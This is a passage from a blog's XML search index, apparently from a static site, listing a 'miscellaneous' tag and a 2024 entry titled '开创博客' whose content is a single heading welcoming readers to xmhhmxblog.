            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开创博客</title>
      <link href="/2024/05/20/kai-chuang-bo-ke/"/>
      <url>/2024/05/20/kai-chuang-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="欢迎来到-xmhhmxblog！"><a href="#欢迎来到-xmhhmxblog！" class="headerlink" title="欢迎来到 xmhhmxblog！"></a>欢迎来到 xmhhmxblog！</h1>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
